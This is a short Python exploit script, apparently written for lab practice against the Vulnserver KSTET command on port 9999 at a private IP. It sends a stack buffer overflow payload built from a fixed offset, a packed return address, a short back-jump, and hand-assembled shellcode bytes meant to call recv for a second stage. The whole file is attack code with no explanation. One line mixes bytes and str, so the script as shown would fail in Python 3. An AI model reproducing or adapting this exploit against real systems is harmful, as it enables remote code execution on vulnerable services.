#!/usr/bin/python3

import socket
import struct
import subprocess

target_ip = "192.168.255.140"
target_port = 9999

def make_string(offset):
    prepend = b"KSTET "
    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" %offset
    #check_string = subprocess.check_output(cmd, shell=True)
    eip = struct.pack("<I", 0x62501205)
    call_recv = b"\x54\x59\x66\x81\xE9\x7C\x02\x33\xD2\x52\x80\xC6\x02\x52\x54\x5A\x80\xC2\x08\x52\xFF\x31\xE8\x4E\x2B\x88\xFF"
    junk = b"\xcc" + call_recv + "\xcc"*(offset - 1 - len(call_recv)) + eip + b"\xeb\xb4" + b"C"*100
    crash_string = prepend + junk
    return crash_string

def exploit(crash_string):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(crash_string)
    s.close()

def main():
    offset = 70
    crash_string = make_string(offset)
    exploit(crash_string)

if __name__ == "__main__": 
    main()
